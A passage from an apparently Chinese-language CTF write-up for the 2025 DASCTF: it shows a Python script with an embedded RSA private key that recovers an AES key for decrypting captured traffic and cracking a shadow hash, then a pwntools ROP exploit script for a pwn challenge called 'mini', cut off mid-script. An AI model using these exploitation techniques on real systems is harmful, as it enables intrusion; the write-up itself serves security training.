</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>Crypto.PublicKey</span> <span class=kn>import</span> <span class=n>RSA</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>Crypto.Cipher</span> <span class=kn>import</span> <span class=n>PKCS1_v1_5</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># å°†ä¸‹é¢ä¸¤é¡¹æ›¿æ¢æˆä½ å®é™…çš„æ•°æ®</span>
</span></span><span class=line><span class=cl><span class=n>encrypted_b64</span> <span class=o>=</span> <span class=s2>&#34;O+le5pAWzAptt0OhVjS5eDX3W3X766Hc8QbKMNflhkZM3t8HArZ8YRFM3G7h7MMYrcASwycx7aSU1OL2tChk3O/O8cjw/0C6Agx5qEDeiI3gtnic5/J+cLB0WcspW2t9OiqteGHBtXZx0cXUjUSU/7tPwfnOS3pXjrJRDisgSwE=&#34;</span>
</span></span><span class=line><span class=cl><span class=n>private_key_pem</span> <span class=o>=</span> <span class=s2>&#34;&#34;&#34;-----BEGIN RSA PRIVATE KEY-----
</span></span></span><span class=line><span class=cl><span class=s2>MIICWgIBAAKBgFgmOymT9EJvC8sHTWxov0LQWSomL5DPRiTUEnQnrDmKYGvNSNMJ3V1fR1hr9jQ6
</span></span></span><span class=line><span class=cl><span class=s2>oepvQvjMyWsyTL6J3n9nbOGd5tey/4BLTXHQyaXcSpfl3z61fBJzy91rZrXbzMY1adHH4VYyUoDQ
</span></span></span><span class=line><span class=cl><span class=s2>7qkF2/RVnR8PJVzRoJn+XaH3RabkzHitAgMBAAECgYAb6zfvykmhxPQSQOTXwjFZow2qmN+V2OBZ
</span></span></span><span class=line><span class=cl><span class=s2>h8W0fmBA9T/mxOUc2lH/Yc8CBWe8URm5W7X1gT8GMa825gnPhl1olOcG9QDtvsWZlLa2YIE1VmH9
</span></span></span><span class=line><span class=cl><span class=s2>VexRu+CTaA8YfdQlOQP81P5A8kLOfpqAwvOa166HTTUOLZj1t/wn5DNGDdDnTQJBAJY4ecYJt6OW
</span></span></span><span class=line><span class=cl><span class=s2>6LJsCDoPHDjYPZCtcAv3rAhawzNhltW7Zd5uzN0GqigOWpt+u63pnRXb2HYp2zR5sR/HBbXRqoMC
</span></span></span><span class=line><span class=cl><span class=s2>QQCWOHnGCbejluiybAg6Dxw42D2QrXAL96wIWsMzYZbVu2XebszdBqooDlqbfrut6Z0V29h2Kds0
</span></span></span><span class=line><span class=cl><span class=s2>ebEfxwW10akPAkAomKSYF2IwbIUASt/CSPkYh5/DrIteQJWWQGkGRrZLlnRGM21bwgRUBOUJpqsz
</span></span></span><span class=line><span class=cl><span class=s2>qbGRCbOq407hFI4Ah3mMlFffAkANotDC/kzSJ7e1woK4qnh4XICyKlw6aeAO3hZMCrbDbgBgQZSN
</span></span></span><span class=line><span class=cl><span class=s2>F7bIbg0hgk6NCeC9hDhQ+ZmxWL6QUOOezopXAkAJSa9xZ9Ocse67NBlIaCj4gPuMYs8viR6X6hW0
</span></span></span><span class=line><span class=cl><span class=s2>CXl/c4Aa0+0Cp6NLbD4IPNMseRxK/GNnpl9yCkbSexnQvzMl
</span></span></span><span class=line><span class=cl><span class=s2>-----END RSA PRIVATE KEY-----&#34;&#34;&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># è§£ç Base64åçš„å¯†æ–‡</span>
</span></span><span class=line><span class=cl><span class=n>encrypted_bytes</span> <span class=o>=</span> <span class=n>b64decode</span><span class=p>(</span><span class=n>encrypted_b64</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># å¯¼å…¥ç§é’¥</span>
</span></span><span class=line><span class=cl><span class=n>rsa_key</span> <span class=o>=</span> <span class=n>RSA</span><span class=o>.</span><span class=n>import_key</span><span class=p>(</span><span class=n>private_key_pem</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>cipher_rsa</span> <span class=o>=</span> <span class=n>PKCS1_v1_5</span><span class=o>.</span><span class=n>new</span><span class=p>(</span><span class=n>rsa_key</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># è§£å¯†</span>
</span></span><span class=line><span class=cl><span class=n>sentinel</span> <span class=o>=</span> <span class=sa>b</span><span class=s2>&#34;&#34;</span>
</span></span><span class=line><span class=cl><span class=n>decrypted_p</span> <span class=o>=</span> <span class=n>cipher_rsa</span><span class=o>.</span><span class=n>decrypt</span><span class=p>(</span><span class=n>encrypted_bytes</span><span class=p>,</span> <span class=n>sentinel</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># è¾“å‡ºç»“æœ</span>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=s2>&#34;[+] Recovered p (hex):&#34;</span><span class=p>,</span> <span class=n>decrypted_p</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=s2>&#34;[+] Derived AES key (md5(p)[:16]):&#34;</span><span class=p>,</span> <span class=nb>__import__</span><span class=p>(</span><span class=s2>&#34;hashlib&#34;</span><span class=p>)</span><span class=o>.</span><span class=n>md5</span><span class=p>(</span><span class=n>decrypted_p</span><span class=p>)</span><span class=o>.</span><span class=n>hexdigest</span><span class=p>()[:</span><span class=mi>16</span><span class=p>])</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># [+] Recovered p (hex): b&#39;519a73ca97a9e3ea&#39;</span>
</span></span><span class=line><span class=cl><span class=c1># [+] Derived AES key (md5(p)[:16]): d14d8ce94563e71a</span>
</span></span></code></pre></td></tr></table></div></div><p>å¾—åˆ°keyå°±å¯ä»¥å¯¹æµé‡è§£å¯†äº†</p><p>ç”¨åœ¨çº¿ç½‘ç«™ <a href=http://tools.bugscaner.com/cryptoaes/>http://tools.bugscaner.com/cryptoaes/</a> è§£å¯†ï¼Œç„¶åbase64è§£ä¸€ä¸‹msgï¼Œæœ€åçˆ†ç ´shadowçš„hashå³å¯å¾—åˆ°å¯†ç </p><p><img src=/img/2025-DASCTF%E4%B8%8A%E5%8D%8A%E5%B9%B4/d10d1d52-b2ec-4fd6-81c9-4785a7028753.png alt=img></p><p><img src=/img/2025-DASCTF%E4%B8%8A%E5%8D%8A%E5%B9%B4/8e853000-f963-4e15-8f83-b8a3275b16d4.png alt=img></p><p><img src=/img/2025-DASCTF%E4%B8%8A%E5%8D%8A%E5%B9%B4/89855f6a-481a-427e-81ad-63ec6883d3f2.png alt=img></p><p>md5ä¹‹åå°±æ˜¯flag</p><h1 id=pwn>Pwn</h1><h2 id=mini>mini</h2><p>Only read æŒ‘æˆ˜ï¼Œç»™äº† pop rax ä½†æ˜¯æˆ‘æ²¡æœ‰ç”¨åˆ°ï¼Œ</p><p>å‚è€ƒè¿™ä¸ªæ–‡ç« çš„3 ä¸ª gadget <a href=https://github.com/imLZH1/2025-CTF-writep/tree/main/2025-smileyCTF#pwnbabyrop>https://github.com/imLZH1/2025-CTF-writep/tree/main/2025-smileyCTF#pwnbabyrop</a></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>  1
</span><span class=lnt>  2
</span><span class=lnt>  3
</span><span class=lnt>  4
</span><span class=lnt>  5
</span><span class=lnt>  6
</span><span class=lnt>  7
</span><span class=lnt>  8
</span><span class=lnt>  9
</span><span class=lnt> 10
</span><span class=lnt> 11
</span><span class=lnt> 12
</span><span class=lnt> 13
</span><span class=lnt> 14
</span><span class=lnt> 15
</span><span class=lnt> 16
</span><span class=lnt> 17
</span><span class=lnt> 18
</span><span class=lnt> 19
</span><span class=lnt> 20
</span><span class=lnt> 21
</span><span class=lnt> 22
</span><span class=lnt> 23
</span><span class=lnt> 24
</span><span class=lnt> 25
</span><span class=lnt> 26
</span><span class=lnt> 27
</span><span class=lnt> 28
</span><span class=lnt> 29
</span><span class=lnt> 30
</span><span class=lnt> 31
</span><span class=lnt> 32
</span><span class=lnt> 33
</span><span class=lnt> 34
</span><span class=lnt> 35
</span><span class=lnt> 36
</span><span class=lnt> 37
</span><span class=lnt> 38
</span><span class=lnt> 39
</span><span class=lnt> 40
</span><span class=lnt> 41
</span><span class=lnt> 42
</span><span class=lnt> 43
</span><span class=lnt> 44
</span><span class=lnt> 45
</span><span class=lnt> 46
</span><span class=lnt> 47
</span><span class=lnt> 48
</span><span class=lnt> 49
</span><span class=lnt> 50
</span><span class=lnt> 51
</span><span class=lnt> 52
</span><span class=lnt> 53
</span><span class=lnt> 54
</span><span class=lnt> 55
</span><span class=lnt> 56
</span><span class=lnt> 57
</span><span class=lnt> 58
</span><span class=lnt> 59
</span><span class=lnt> 60
</span><span class=lnt> 61
</span><span class=lnt> 62
</span><span class=lnt> 63
</span><span class=lnt> 64
</span><span class=lnt> 65
</span><span class=lnt> 66
</span><span class=lnt> 67
</span><span class=lnt> 68
</span><span class=lnt> 69
</span><span class=lnt> 70
</span><span class=lnt> 71
</span><span class=lnt> 72
</span><span class=lnt> 73
</span><span class=lnt> 74
</span><span class=lnt> 75
</span><span class=lnt> 76
</span><span class=lnt> 77
</span><span class=lnt> 78
</span><span class=lnt> 79
</span><span class=lnt> 80
</span><span class=lnt> 81
</span><span class=lnt> 82
</span><span class=lnt> 83
</span><span class=lnt> 84
</span><span class=lnt> 85
</span><span class=lnt> 86
</span><span class=lnt> 87
</span><span class=lnt> 88
</span><span class=lnt> 89
</span><span class=lnt> 90
</span><span class=lnt> 91
</span><span class=lnt> 92
</span><span class=lnt> 93
</span><span class=lnt> 94
</span><span class=lnt> 95
</span><span class=lnt> 96
</span><span class=lnt> 97
</span><span class=lnt> 98
</span><span class=lnt> 99
</span><span class=lnt>100
</span><span class=lnt>101
</span><span class=lnt>102
</span><span class=lnt>103
</span><span class=lnt>104
</span><span class=lnt>105
</span><span class=lnt>106
</span><span class=lnt>107
</span><span class=lnt>108
</span><span class=lnt>109
</span><span class=lnt>110
</span><span class=lnt>111
</span><span class=lnt>112
</span><span class=lnt>113
</span><span class=lnt>114
</span><span class=lnt>115
</span><span class=lnt>116
</span><span class=lnt>117
</span><span class=lnt>118
</span><span class=lnt>119
</span><span class=lnt>120
</span><span class=lnt>121
</span><span class=lnt>122
</span><span class=lnt>123
</span><span class=lnt>124
</span><span class=lnt>125
</span><span class=lnt>126
</span><span class=lnt>127
</span><span class=lnt>128
</span><span class=lnt>129
</span><span class=lnt>130
</span><span class=lnt>131
</span><span class=lnt>132
</span><span class=lnt>133
</span><span class=lnt>134
</span><span class=lnt>135
</span><span class=lnt>136
</span><span class=lnt>137
</span><span class=lnt>138
</span><span class=lnt>139
</span><span class=lnt>140
</span><span class=lnt>141
</span><span class=lnt>142
</span><span class=lnt>143
</span><span class=lnt>144
</span><span class=lnt>145
</span><span class=lnt>146
</span><span class=lnt>147
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-Python data-lang=Python><span class=line><span class=cl><span class=kn>from</span> <span class=nn>pwn</span> <span class=kn>import</span> <span class=o>*</span>
</span></span><span class=line><span class=cl><span class=c1>#from ctypes import CDLL</span>
</span></span><span class=line><span class=cl><span class=c1>#cdl = CDLL(&#39;/lib/x86_64-linux-gnu/libc.so.6&#39;)</span>
</span></span><span class=line><span class=cl><span class=n>s</span>    <span class=o>=</span> <span class=k>lambda</span>   <span class=n>x</span> <span class=p>:</span> <span class=n>io</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=n>x</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>sa</span>   <span class=o>=</span> <span class=k>lambda</span> <span class=n>x</span><span class=p>,</span><span class=n>y</span> <span class=p>:</span> <span class=n>io</span><span class=o>.</span><span class=n>sendafter</span><span class=p>(</span><span class=n>x</span><span class=p>,</span><span class=n>y</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>sl</span>   <span class=o>=</span> <span class=k>lambda</span>   <span class=n>x</span> <span class=p>:</span> <span class=n>io</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=n>x</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>sla</span>  <span class=o>=</span> <span class=k>lambda</span> <span class=n>x</span><span class=p>,</span><span class=n>y</span> <span class=p>:</span> <span class=n>io</span><span class=o>.</span><span class=n>sendlineafter</span><span class=p>(</span><span class=n>x</span><span class=p>,</span><span class=n>y</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>r</span>    <span class=o>=</span> <span class=k>lambda</span> <span class=n>x</span>   <span class=p>:</span> <span class=n>io</span><span class=o>.</span><span class=n>recv</span><span class=p>(</span><span class=n>x</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>ru</span>   <span class=o>=</span> <span class=k>lambda</span> <span class=n>x</span>   <span class=p>:</span> <span class=n>io</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=n>x</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>rl</span>   <span class=o>=</span> <span class=k>lambda</span>     <span class=p>:</span> <span class=n>io</span><span class=o>.</span><span class=n>recvline</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=n>itr</span>  <span class=o>=</span> <span class=k>lambda</span>     <span class=p>:</span> <span class=n>io</span><span class=o>.</span><span class=n>interactive</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=n>uu32</span> <span class=o>=</span> <span class=k>lambda</span> <span class=n>x</span>   <span class=p>:</span> <span class=n>u32</span><span class=p>(</span><span class=n>x</span><span class=o>.</span><span class=n>ljust</span><span class=p>(</span><span class=mi>4</span><span class=p>,</span><span class=sa>b</span><span class=s1>&#39;</span><span class=se>\x00</span><span class=s1>&#39;</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=n>uu64</span> <span class=o>=</span> <span class=k>lambda</span> <span class=n>x</span>   <span class=p>:</span> <span class=n>u64</span><span class=p>(</span><span class=n>x</span><span class=o>.</span><span class=n>ljust</span><span class=p>(</span><span class=mi>8</span><span class=p>,</span><span class=sa>b</span><span class=s1>&#39;</span><span class=se>\x00</span><span class=s1>&#39;</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=n>ls</span>   <span class=o>=</span> <span class=k>lambda</span> <span class=n>x</span>   <span class=p>:</span> <span class=n>log</span><span class=o>.</span><span class=n>success</span><span class=p>(</span><span class=n>x</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>lss</span>  <span class=o>=</span> <span class=k>lambda</span> <span class=n>x</span>   <span class=p>:</span> <span class=n>ls</span><span class=p>(</span><span class=s1>&#39;</span><span class=se>\033</span><span class=s1>[1;31;40m</span><span class=si>%s</span><span class=s1> -&gt; 0x</span><span class=si>%x</span><span class=s1> </span><span class=se>\033</span><span class=s1>[0m&#39;</span> <span class=o>%</span> <span class=p>(</span><span class=n>x</span><span class=p>,</span> <span class=nb>eval</span><span class=p>(</span><span class=n>x</span><span class=p>)))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>attack</span> <span class=o>=</span> <span class=s1>&#39;node5.buuoj.cn:29466&#39;</span><span class=o>.</span><span class=n>replace</span><span class=p>(</span><span class=s1>&#39; &#39;</span><span class=p>,</span><span class=s1>&#39;:&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>binary</span> <span class=o>=</span> <span class=s1>&#39;./chal&#39;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>start</span><span class=p>(</span><span class=n>argv</span><span class=o>=</span><span class=p>[],</span> <span class=o>*</span><span class=n>a</span><span class=p>,</span> <span class=o>**</span><span class=n>kw</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>args</span><span class=o>.</span><span class=n>GDB</span><span class=p>:</span><span class=k>return</span> <span class=n>gdb</span><span class=o>.</span><span class=n>debug</span><span class=p>(</span><span class=n>binary</span><span class=p>,</span><span class=n>gdbscript</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>args</span><span class=o>.</span><span class=n>TAG</span><span class=p>:</span><span class=k>return</span> <span class=n>remote</span><span class=p>(</span><span class=o>*</span><span class=n>args</span><span class=o>.</span><span class=n>TAG</span><span class=o>.</span><span class=n>split</span><span class=p>(</span><span class=s1>&#39;:&#39;</span><span class=p>))</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>args</span><span class=o>.</span><span class=n>REM</span><span class=p>:</span><span class=k>return</span> <span class=n>remote</span><span class=p>(</span><span class=o>*</span><span class=n>attack</span><span class=o>.</span><span class=n>split</span><span class=p>(</span><span class=s1>&#39;:&#39;</span><span class=p>))</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>process</span><span class=p>([</span><span class=n>binary</span><span class=p>]</span> <span class=o>+</span> <span class=n>argv</span><span class=p>,</span> <span class=o>*</span><span class=n>a</span><span class=p>,</span> <span class=o>**</span><span class=n>kw</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>context</span><span class=p>(</span><span class=n>binary</span> <span class=o>=</span> <span class=n>binary</span><span class=p>,</span> <span class=n>log_level</span> <span class=o>=</span> <span class=s1>&#39;debug&#39;</span><span class=p>,</span>
</span></span><span class=line><span class=cl><span class=n>terminal</span><span class=o>=</span><span class=s1>&#39;tmux splitw -h -l 170&#39;</span><span class=o>.</span><span class=n>split</span><span class=p>(</span><span class=s1>&#39; &#39;</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=c1>#libc = context.binary.libc</span>
</span></span><span class=line><span class=cl><span class=c1>#elf  = ELF(binary)</span>
</span></span><span class=line><span class=cl><span class=c1>#print(context.binary.libs)</span>
</span></span><span class=line><span class=cl><span class=c1>#libc = ELF(&#39;./libc.so.6&#39;)</span>
</span></span><span class=line><span class=cl><span class=c1>#import socks</span>
</span></span><span class=line><span class=cl><span class=c1>#context.proxy = (socks.SOCKS5, &#39;192.168.31.251&#39;, 10808)</span>
</span></span><span class=line><span class=cl><span class=n>gdbscript</span> <span class=o>=</span> <span class=s1>&#39;&#39;&#39;
</span></span></span><span class=line><span class=cl><span class=s1>b * 0x0040114E
</span></span></span><span class=line><span class=cl><span class=s1>#continue
</span></span></span><span class=line><span class=cl><span class=s1>&#39;&#39;&#39;</span><span class=o>.</span><span class=n>format</span><span class=p>(</span><span class=o>**</span><span class=nb>locals</span><span class=p>())</span>
</span></span><span class=line><span class=cl><span class=c1>#import os</span>
</span></span><span class=line><span class=cl><span class=c1>#os.systimport os</span>
</span></span><span class=line><span class=cl><span class=c1>#io = remote(*attack.split(&#39;:&#39;))</span>
</span></span><span class=line><span class=cl><span class=n>io</span> <span class=o>=</span> <span class=n>start</span><span class=p>([])</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>bss</span> <span class=o>=</span> <span class=mh>0x404000</span> <span class=o>+</span> <span class=mh>0x800</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>ret1</span> <span class=o>=</span> <span class=mh>0x0401133</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>pay</span> <span class=o>=</span> <span class=sa>b</span><span class=s1>&#39;a&#39;</span> <span class=o>*</span><span class=mh>0x10</span>
</span></span><span class=line><span class=cl><span class=n>pay</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=mh>0x404000</span> <span class=o>+</span> <span class=mh>0xe00</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>pay</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=n>ret1</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>s</span><span class=p>(</span><span class=n>pay</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>add_ebx</span> <span class=o>=</span> <span class=mh>0x000000000040110c</span> <span class=c1># add dword ptr [rbp - 0x3d], ebx ; nop ; ret</span>
</span></span><span class=line><span class=cl><span class=n>magic2</span>  <span class=o>=</span> <span class=mh>0x4010FC</span>
</span></span><span class=line><span class=cl><span class=n>start</span>   <span class=o>=</span> <span class=mh>0x401049</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>rax</span> <span class=o>=</span> <span class=mh>0x0000000000401126</span> <span class=c1># pop rax ; ret</span>
</span></span><span class=line><span class=cl><span class=n>rbp</span> <span class=o>=</span> <span class=mh>0x000000000040110d</span> <span class=c1># pop rbp ; ret</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>rop</span> <span class=o>=</span> <span class=p>[</span>
</span></span><span class=line><span class=cl>    <span class=mh>0xbeef</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=n>bss</span> <span class=o>+</span> <span class=mh>0x800</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=n>rbp</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=mh>0x404ef8</span> <span class=o>-</span> <span class=mh>0x48</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=n>magic2</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=mi>0</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=n>start</span>
</span></span><span class=line><span class=cl>        <span class=p>]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>#pay  = p64(0xbeef) + p64(0x0)</span>
</span></span><span class=line><span class=cl><span class=c1>#pay += p64(bss)</span>
</span></span><span class=line><span class=cl><span class=c1>#pay += p64(ret1)</span>
</span></span><span class=line><span class=cl><span class=c1>#s(pay)</span>
</span></span><span class=line><span class=cl><span class=n>bss</span> <span class=o>+=</span> <span class=mi>8</span>
</span></span><span class=line><span class=cl><span class=n>offset1</span> <span class=o>=</span> <span class=mh>0xb323e</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>pay</span>  <span class=o>=</span> <span class=n>p64</span><span class=p>(</span><span class=mh>0xbeefbeef1</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=mh>0xbeefbeef2</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>pay</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=mh>0x000401049</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>pay</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=n>start</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>s</span><span class=p>(</span><span class=n>pay</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>pause</span><span class=p>()</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>pay</span> <span class=o>=</span> <span class=sa>b</span><span class=s1>&#39;a&#39;</span> <span class=o>*</span><span class=mh>0x10</span>
</span></span><span class=line><span class=cl><span class=n>pay</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=n>bss</span><span class=o>+</span><span class=mh>0x4d8</span><span class=o>+</span><span class=mh>0xb8</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>pay</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=n>ret1</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>s</span><span class=p>(</span><span class=n>pay</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>pause</span><span class=p>()</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>pay</span> <span class=o>=</span> <span class=sa>b</span><span class=s1>&#39;a&#39;</span> <span class=o>*</span><span class=mh>0x10</span>
</span></span><span class=line><span class=cl><span class=n>pay</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=n>bss</span><span class=o>+</span><span class=mh>0x18</span><span class=o>+</span><span class=mh>0xb8</span><span class=o>+</span><span class=mh>0x4d8</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>pay</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=n>ret1</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>s</span><span class=p>(</span><span class=n>pay</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>pause</span><span class=p>()</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>pay</span>  <span class=o>=</span> <span class=n>p64</span><span class=p>(</span><span class=n>rbp</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>bss</span><span class=o>+</span><span class=mh>0x28</span><span class=o>+</span><span class=mh>0xb8</span><span class=o>+</span><span class=mh>0x4d8</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>pay</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=n>ret1</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=c1>#pay += p64(0x111111111)</span>
</span></span><span class=line><span class=cl><span class=n>s</span><span class=p>(</span><span class=n>pay</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>pause</span><span class=p>()</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>lss</span><span class=p>(</span><span class=s1>&#39;offset1&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>pay</span> <span class=o>=</span> <span class=n>p64</span><span class=p>(</span><span class=n>rbp</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=mh>0x404dc8</span><span class=o>-</span><span class=mh>0x48</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>pay</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=n>magic2</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>offset1</span><span class=o>-</span><span class=mh>0x21</span><span class=p>)</span> <span class=c1># è¿™é‡Œä¸å¤Ÿå›åˆ° _start å‡½æ•°ï¼Œè¦æå‰åœ¨stack ä¸Šå¸ƒç½®</span>
</span></span><span class=line><span class=cl><span class=n>s</span><span class=p>(</span><span class=n>pay</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>pause</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=n>lss</span><span class=p>(</span><span class=s1>&#39;offset1&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>oo</span> <span class=o>=</span> <span class=mi>0</span>
</span></span><span class=line><span class=cl><span class=n>pay</span> <span class=o>=</span> <span class=sa>b</span><span class=s1>&#39;A&#39;</span> <span class=o>*</span><span class=mh>0x10</span>
</span></span><span class=line><span class=cl><span class=n>pay</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=n>bss</span><span class=o>+</span><span class=n>oo</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>pay</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=n>ret1</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>s</span><span class=p>(</span><span class=n>pay</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>pause</span><span class=p>()</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>pay</span> <span class=o>=</span> <span class=sa>b</span><span class=s1>&#39;B&#39;</span> <span class=o>*</span><span class=mh>0x10</span>
</span></span><span class=line><span class=cl><span class=n>pay</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=n>bss</span><span class=o>+</span><span class=mh>0x18</span><span class=o>+</span><span class=n>oo</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>pay</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=n>ret1</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>s</span><span class=p>(</span><span class=n>pay</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>pause</span><span class=p>()</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>offset</span> <span class=o>=</span> <span class=mh>0x404d68</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>pay</span>  <span class=o>=</span> <span class=n>p64</span><span class=p>(</span><span class=n>rbp</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>offset</span><span class=o>+</span><span class=mh>0x3d</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>pay</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=n>add_ebx</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>pay</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=mh>0x00401049</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>s</span><span class=p>(</span><span class=n>pay</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>pause</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=n>oo</span> <span class=o>=</span> <span class=mi>0</span>
</span></span><span class=line><span class=cl><span class=n>pay</span> <span class=o>=</span> <span class=sa>b</span><span class=s1>&#39;A&#39;</span> <span class=o>*</span><span class=mh>0x10</span>
</span></span><span class=line><span class=cl><span class=n>pay</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=n>bss</span><span class=o>+</span><span class=n>oo</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>pay</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=n>ret1</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>s</span><span class=p>(</span><span class=n>pay</span><span class=p>)</span>
